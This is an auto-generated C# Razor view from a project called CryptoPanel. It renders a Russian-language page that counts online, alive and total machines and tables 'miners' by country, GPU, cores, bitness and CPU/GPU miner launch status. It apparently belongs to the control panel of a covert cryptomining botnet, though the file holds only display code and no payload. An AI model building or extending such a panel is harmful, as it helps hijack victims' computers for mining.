#pragma checksum "C:\Users\0XDA0\source\repos\CryptoPanel\CryptoPanel\Views\Bar\Statistics.cshtml" "{ff1816ec-aa5e-4d10-87f7-6f4963833460}" "b2d345b9793456f44148c99fa7bfcd34f4b6c849"
// <auto-generated/>
#pragma warning disable 1591
[assembly: global::Microsoft.AspNetCore.Razor.Hosting.RazorCompiledItemAttribute(typeof(AspNetCore.Views_Bar_Statistics), @"mvc.1.0.view", @"/Views/Bar/Statistics.cshtml")]
namespace AspNetCore
{
    #line hidden
    using System;
    using System.Collections.Generic;
    using System.Linq;
    using System.Threading.Tasks;
    using Microsoft.AspNetCore.Mvc;
    using Microsoft.AspNetCore.Mvc.Rendering;
    using Microsoft.AspNetCore.Mvc.ViewFeatures;
#nullable restore
#line 1 "C:\Users\0XDA0\source\repos\CryptoPanel\CryptoPanel\Views\_ViewImports.cshtml"
using CryptoPanel;

#line default
#line hidden
#nullable disable
#nullable restore
#line 1 "C:\Users\0XDA0\source\repos\CryptoPanel\CryptoPanel\Views\Bar\Statistics.cshtml"
using CryptoPanel.Models;

#line default
#line hidden
#nullable disable
    [global::Microsoft.AspNetCore.Razor.Hosting.RazorSourceChecksumAttribute(@"SHA1", @"b2d345b9793456f44148c99fa7bfcd34f4b6c849", @"/Views/Bar/Statistics.cshtml")]
    [global::Microsoft.AspNetCore.Razor.Hosting.RazorSourceChecksumAttribute(@"SHA1", @"b86dd3a12f94c0282f0c517639583fa7e1470561", @"/Views/_ViewImports.cshtml")]
    public class Views_Bar_Statistics : global::Microsoft.AspNetCore.Mvc.Razor.RazorPage<Pagination<CryptoPanel.Models.Stats>>
    {
        private static readonly global::Microsoft.AspNetCore.Razor.TagHelpers.TagHelperAttribute __tagHelperAttribute_0 = new global::Microsoft.AspNetCore.Razor.TagHelpers.TagHelperAttribute("asp-action", "Statistics", global::Microsoft.AspNetCore.Razor.TagHelpers.HtmlAttributeValueStyle.DoubleQuotes);
        #line hidden
        #pragma warning disable 0649
        private global::Microsoft.AspNetCore.Razor.Runtime.TagHelpers.TagHelperExecutionContext __tagHelperExecutionContext;
        #pragma warning restore 0649
        private global::Microsoft.AspNetCore.Razor.Runtime.TagHelpers.TagHelperRunner __tagHelperRunner = new global::Microsoft.AspNetCore.Razor.Runtime.TagHelpers.TagHelperRunner();
        #pragma warning disable 0169
        private string __tagHelperStringValueBuffer;
        #pragma warning restore 0169
        private global::Microsoft.AspNetCore.Razor.Runtime.TagHelpers.TagHelperScopeManager __backed__tagHelperScopeManager = null;
        private global::Microsoft.AspNetCore.Razor.Runtime.TagHelpers.TagHelperScopeManager __tagHelperScopeManager
        {
            get
            {
                if (__backed__tagHelperScopeManager == null)
                {
                    __backed__tagHelperScopeManager = new global::Microsoft.AspNetCore.Razor.Runtime.TagHelpers.TagHelperScopeManager(StartTagHelperWritingScope, EndTagHelperWritingScope);
                }
                return __backed__tagHelperScopeManager;
            }
        }
        private global::Microsoft.AspNetCore.Mvc.TagHelpers.AnchorTagHelper __Microsoft_AspNetCore_Mvc_TagHelpers_AnchorTagHelper;
        #pragma warning disable 1998
        public async override global::System.Threading.Tasks.Task ExecuteAsync()
        {
            WriteLiteral("\r\n");
#nullable restore
#line 5 "C:\Users\0XDA0\source\repos\CryptoPanel\CryptoPanel\Views\Bar\Statistics.cshtml"
  
    ViewData["Title"] = "Статистика";

#line default
#line hidden
#nullable disable
            WriteLiteral("\r\n<div class=\"card-deck\">\r\n    <div class=\"card\">\r\n        <div class=\"card-body\">\r\n            <center>\r\n                <p class=\"card-text\">Онлайн</p>\r\n                <h5 class=\"card-title\">");
#nullable restore
#line 14 "C:\Users\0XDA0\source\repos\CryptoPanel\CryptoPanel\Views\Bar\Statistics.cshtml"
                                  Write(ViewBag.Online);

#line default
#line hidden
#nullable disable
            WriteLiteral("</h5>\r\n            </center>\r\n        </div>\r\n    </div>\r\n    <div class=\"card\">\r\n        <div class=\"card-body\">\r\n            <center>\r\n                <p class=\"card-text\">Живые</p>\r\n                <h5 class=\"card-title\">");
#nullable restore
#line 22 "C:\Users\0XDA0\source\repos\CryptoPanel\CryptoPanel\Views\Bar\Statistics.cshtml"
                                  Write(ViewBag.Alive);

#line default
#line hidden
#nullable disable
            WriteLiteral("</h5>\r\n            </center>\r\n        </div>\r\n    </div>\r\n    <div class=\"card\">\r\n        <div class=\"card-body\">\r\n            <center>\r\n                <p class=\"card-text\">Всего</p>\r\n                <h5 class=\"card-title\">");
#nullable restore
#line 30 "C:\Users\0XDA0\source\repos\CryptoPanel\CryptoPanel\Views\Bar\Statistics.cshtml"
                                  Write(ViewBag.All);

#line default
#line hidden
#nullable disable
            WriteLiteral(@"</h5>
            </center>
        </div>
    </div>
</div>

<div class=""text-center"">
    <h1 class=""display-4"">Шахтеры</h1>
    <table class=""table"">
        <thead>
            <tr>
                <th scope=""col"">Ид</th>
                <th scope=""col"">Язык</th>
                <th scope=""col"">Видеокарта</th>
                <th scope=""col"">Ядра</th>
                <th scope=""col"">Разрядность системы</th>
                <th scope=""col"">CPU</th>
                <th scope=""col"">GPU</th>
            </tr>
        </thead>
        <tbody>
");
#nullable restore
#line 51 "C:\Users\0XDA0\source\repos\CryptoPanel\CryptoPanel\Views\Bar\Statistics.cshtml"
              
                foreach (var stats in Model)
                {

#line default
#line hidden
#nullable disable
            WriteLiteral("                        <tr>\r\n                            <th>");
#nullable restore
#line 55 "C:\Users\0XDA0\source\repos\CryptoPanel\CryptoPanel\Views\Bar\Statistics.cshtml"
                           Write(stats.Unique);

#line default
#line hidden
#nullable disable
            WriteLiteral("</th>\r\n                            <td>");
#nullable restore
#line 56 "C:\Users\0XDA0\source\repos\CryptoPanel\CryptoPanel\Views\Bar\Statistics.cshtml"
                           Write(stats.Country);

#line default
#line hidden
#nullable disable
            WriteLiteral("</td>\r\n                            <td>");
#nullable restore
#line 57 "C:\Users\0XDA0\source\repos\CryptoPanel\CryptoPanel\Views\Bar\Statistics.cshtml"
                           Write(stats.Video);

#line default
#line hidden
#nullable disable
            WriteLiteral("</td>\r\n                            <td>");
#nullable restore
#line 58 "C:\Users\0XDA0\source\repos\CryptoPanel\CryptoPanel\Views\Bar\Statistics.cshtml"
                           Write(stats.Cores);

#line default
#line hidden
#nullable disable
            WriteLiteral("</td>\r\n                            <td>");
#nullable restore
#line 59 "C:\Users\0XDA0\source\repos\CryptoPanel\CryptoPanel\Views\Bar\Statistics.cshtml"
                           Write(stats.Bit);

#line default
#line hidden
#nullable disable
            WriteLiteral("</td>\r\n\r\n");
#nullable restore
#line 61 "C:\Users\0XDA0\source\repos\CryptoPanel\CryptoPanel\Views\Bar\Statistics.cshtml"
                             if (stats.ToyCpuStatus == "Запуcтился")
                            {

#line default
#line hidden
#nullable disable
            WriteLiteral("                                <td class=\"table-success\">");
#nullable restore
#line 63 "C:\Users\0XDA0\source\repos\CryptoPanel\CryptoPanel\Views\Bar\Statistics.cshtml"
                                                     Write(stats.ToyCpuStatus);

#line default
#line hidden
#nullable disable
            WriteLiteral("</td>\r\n");
#nullable restore
#line 64 "C:\Users\0XDA0\source\repos\CryptoPanel\CryptoPanel\Views\Bar\Statistics.cshtml"
                            }
                            else if (stats.ToyCpuStatus == "Не запустился")
                            {

#line default
#line hidden
#nullable disable
            WriteLiteral("                                <td class=\"table-danger\">");
#nullable restore
#line 67 "C:\Users\0XDA0\source\repos\CryptoPanel\CryptoPanel\Views\Bar\Statistics.cshtml"
                                                    Write(stats.ToyCpuStatus);

#line default
#line hidden
#nullable disable
            WriteLiteral("</td>\r\n");
#nullable restore
#line 68 "C:\Users\0XDA0\source\repos\CryptoPanel\CryptoPanel\Views\Bar\Statistics.cshtml"
                            }

#line default
#line hidden
#nullable disable
            WriteLiteral("\r\n");
#nullable restore
#line 70 "C:\Users\0XDA0\source\repos\CryptoPanel\CryptoPanel\Views\Bar\Statistics.cshtml"
                             if (stats.ToyGpuStatus == "Запустился")
                            {

#line default
#line hidden
#nullable disable
            WriteLiteral("                                <td class=\"table-success\">");
#nullable restore
#line 72 "C:\Users\0XDA0\source\repos\CryptoPanel\CryptoPanel\Views\Bar\Statistics.cshtml"
                                                     Write(stats.ToyGpuStatus);

#line default
#line hidden
#nullable disable
            WriteLiteral("</td>\r\n");
#nullable restore
#line 73 "C:\Users\0XDA0\source\repos\CryptoPanel\CryptoPanel\Views\Bar\Statistics.cshtml"
                            }
                            else if (stats.ToyGpuStatus == "Не запустился")
                            {

#line default
#line hidden
#nullable disable
            WriteLiteral("                                <td class=\"table-danger\">");
#nullable restore
#line 76 "C:\Users\0XDA0\source\repos\CryptoPanel\CryptoPanel\Views\Bar\Statistics.cshtml"
                                                    Write(stats.ToyGpuStatus);

#line default
#line hidden
#nullable disable
            WriteLiteral("</td>\r\n");
#nullable restore
#line 77 "C:\Users\0XDA0\source\repos\CryptoPanel\CryptoPanel\Views\Bar\Statistics.cshtml"
                            }
                            else if (stats.ToyGpuStatus == "Меньше 4ГБ")
                            {

#line default
#line hidden
#nullable disable
            WriteLiteral("                                <td class=\"table-warning\">");
#nullable restore
#line 80 "C:\Users\0XDA0\source\repos\CryptoPanel\CryptoPanel\Views\Bar\Statistics.cshtml"
                                                     Write(stats.ToyGpuStatus);

#line default
#line hidden
#nullable disable
            WriteLiteral("</td>\r\n");
#nullable restore
#line 81 "C:\Users\0XDA0\source\repos\CryptoPanel\CryptoPanel\Views\Bar\Statistics.cshtml"
                            }

#line default
#line hidden
#nullable disable
            WriteLiteral("                        </tr>\r\n");
#nullable restore
#line 83 "C:\Users\0XDA0\source\repos\CryptoPanel\CryptoPanel\Views\Bar\Statistics.cshtml"
                }
            

#line default
#line hidden
#nullable disable
            WriteLiteral("        </tbody>\r\n    </table>\r\n</div>\r\n\r\n");
#nullable restore
#line 89 "C:\Users\0XDA0\source\repos\CryptoPanel\CryptoPanel\Views\Bar\Statistics.cshtml"
  
    var predDisabled = !Model.PreviousPage ? "disabled" : "";
    var nextDisabled = !Model.NextPage ? "disabled" : "";

#line default
#line hidden
#nullable disable
            WriteLiteral("\r\n<center>\r\n");
            __tagHelperExecutionContext = __tagHelperScopeManager.Begin("a", global::Microsoft.AspNetCore.Razor.TagHelpers.TagMode.StartTagAndEndTag, "b2d345b9793456f44148c99fa7bfcd34f4b6c84911784", async() => {
                WriteLiteral("\r\n    Предыдущая\r\n");
            }
            );
            __Microsoft_AspNetCore_Mvc_TagHelpers_AnchorTagHelper = CreateTagHelper<global::Microsoft.AspNetCore.Mvc.TagHelpers.AnchorTagHelper>();
            __tagHelperExecutionContext.Add(__Microsoft_AspNetCore_Mvc_TagHelpers_AnchorTagHelper);
            __Microsoft_AspNetCore_Mvc_TagHelpers_AnchorTagHelper.Action = (string)__tagHelperAttribute_0.Value;
            __tagHelperExecutionContext.AddTagHelperAttribute(__tagHelperAttribute_0);
            if (__Microsoft_AspNetCore_Mvc_TagHelpers_AnchorTagHelper.RouteValues == null)
            {
                throw new InvalidOperationException(InvalidTagHelperIndexerAssignment("asp-route-pageNumber", "Microsoft.AspNetCore.Mvc.TagHelpers.AnchorTagHelper", "RouteValues"));
            }
            BeginWriteTagHelperAttribute();
#nullable restore
#line 96 "C:\Users\0XDA0\source\repos\CryptoPanel\CryptoPanel\Views\Bar\Statistics.cshtml"
              WriteLiteral(Model.PageIndex - 1);

#line default
#line hidden
#nullable disable
            __tagHelperStringValueBuffer = EndWriteTagHelperAttribute();
            __Microsoft_AspNetCore_Mvc_TagHelpers_AnchorTagHelper.RouteValues["pageNumber"] = __tagHelperStringValueBuffer;
            __tagHelperExecutionContext.AddTagHelperAttribute("asp-route-pageNumber", __Microsoft_AspNetCore_Mvc_TagHelpers_AnchorTagHelper.RouteValues["pageNumber"], global::Microsoft.AspNetCore.Razor.TagHelpers.HtmlAttributeValueStyle.DoubleQuotes);
            BeginAddHtmlAttributeValues(__tagHelperExecutionContext, "class", 3, global::Microsoft.AspNetCore.Razor.TagHelpers.HtmlAttributeValueStyle.DoubleQuotes);
            AddHtmlAttributeValue("", 3206, "btn", 3206, 3, true);
            AddHtmlAttributeValue(" ", 3209, "btn-default", 3210, 12, true);
#nullable restore
#line 97 "C:\Users\0XDA0\source\repos\CryptoPanel\CryptoPanel\Views\Bar\Statistics.cshtml"
AddHtmlAttributeValue(" ", 3221, predDisabled, 3222, 13, false);

#line default
#line hidden
#nullable disable
            EndAddHtmlAttributeValues(__tagHelperExecutionContext);
            await __tagHelperRunner.RunAsync(__tagHelperExecutionContext);
            if (!__tagHelperExecutionContext.Output.IsContentModified)
            {
                await __tagHelperExecutionContext.SetOutputContentAsync();
            }
            Write(__tagHelperExecutionContext.Output);
            __tagHelperExecutionContext = __tagHelperScopeManager.End();
            WriteLiteral("\r\n");
            __tagHelperExecutionContext = __tagHelperScopeManager.Begin("a", global::Microsoft.AspNetCore.Razor.TagHelpers.TagMode.StartTagAndEndTag, "b2d345b9793456f44148c99fa7bfcd34f4b6c84914578", async() => {
                WriteLiteral("\r\n    Следующая\r\n");
            }
            );
            __Microsoft_AspNetCore_Mvc_TagHelpers_AnchorTagHelper = CreateTagHelper<global::Microsoft.AspNetCore.Mvc.TagHelpers.AnchorTagHelper>();
            __tagHelperExecutionContext.Add(__Microsoft_AspNetCore_Mvc_TagHelpers_AnchorTagHelper);
            __Microsoft_AspNetCore_Mvc_TagHelpers_AnchorTagHelper.Action = (string)__tagHelperAttribute_0.Value;
            __tagHelperExecutionContext.AddTagHelperAttribute(__tagHelperAttribute_0);
            if (__Microsoft_AspNetCore_Mvc_TagHelpers_AnchorTagHelper.RouteValues == null)
            {
                throw new InvalidOperationException(InvalidTagHelperIndexerAssignment("asp-route-pageNumber", "Microsoft.AspNetCore.Mvc.TagHelpers.AnchorTagHelper", "RouteValues"));
            }
            BeginWriteTagHelperAttribute();
#nullable restore
#line 101 "C:\Users\0XDA0\source\repos\CryptoPanel\CryptoPanel\Views\Bar\Statistics.cshtml"
              WriteLiteral(Model.PageIndex + 1);

#line default
#line hidden
#nullable disable
            __tagHelperStringValueBuffer = EndWriteTagHelperAttribute();
            __Microsoft_AspNetCore_Mvc_TagHelpers_AnchorTagHelper.RouteValues["pageNumber"] = __tagHelperStringValueBuffer;
            __tagHelperExecutionContext.AddTagHelperAttribute("asp-route-pageNumber", __Microsoft_AspNetCore_Mvc_TagHelpers_AnchorTagHelper.RouteValues["pageNumber"], global::Microsoft.AspNetCore.Razor.TagHelpers.HtmlAttributeValueStyle.DoubleQuotes);
            BeginAddHtmlAttributeValues(__tagHelperExecutionContext, "class", 3, global::Microsoft.AspNetCore.Razor.TagHelpers.HtmlAttributeValueStyle.DoubleQuotes);
            AddHtmlAttributeValue("", 3349, "btn", 3349, 3, true);
            AddHtmlAttributeValue(" ", 3352, "btn-default", 3353, 12, true);
#nullable restore
#line 102 "C:\Users\0XDA0\source\repos\CryptoPanel\CryptoPanel\Views\Bar\Statistics.cshtml"
AddHtmlAttributeValue(" ", 3364, nextDisabled, 3365, 13, false);

#line default
#line hidden
#nullable disable
            EndAddHtmlAttributeValues(__tagHelperExecutionContext);
            await __tagHelperRunner.RunAsync(__tagHelperExecutionContext);
            if (!__tagHelperExecutionContext.Output.IsContentModified)
            {
                await __tagHelperExecutionContext.SetOutputContentAsync();
            }
            Write(__tagHelperExecutionContext.Output);
            __tagHelperExecutionContext = __tagHelperScopeManager.End();
            WriteLiteral("\r\n</center>");
        }
        #pragma warning restore 1998
        [global::Microsoft.AspNetCore.Mvc.Razor.Internal.RazorInjectAttribute]
        public global::Microsoft.AspNetCore.Mvc.ViewFeatures.IModelExpressionProvider ModelExpressionProvider { get; private set; }
        [global::Microsoft.AspNetCore.Mvc.Razor.Internal.RazorInjectAttribute]
        public global::Microsoft.AspNetCore.Mvc.IUrlHelper Url { get; private set; }
        [global::Microsoft.AspNetCore.Mvc.Razor.Internal.RazorInjectAttribute]
        public global::Microsoft.AspNetCore.Mvc.IViewComponentHelper Component { get; private set; }
        [global::Microsoft.AspNetCore.Mvc.Razor.Internal.RazorInjectAttribute]
        public global::Microsoft.AspNetCore.Mvc.Rendering.IJsonHelper Json { get; private set; }
        [global::Microsoft.AspNetCore.Mvc.Razor.Internal.RazorInjectAttribute]
        public global::Microsoft.AspNetCore.Mvc.Rendering.IHtmlHelper<Pagination<CryptoPanel.Models.Stats>> Html { get; private set; }
    }
}
#pragma warning restore 1591
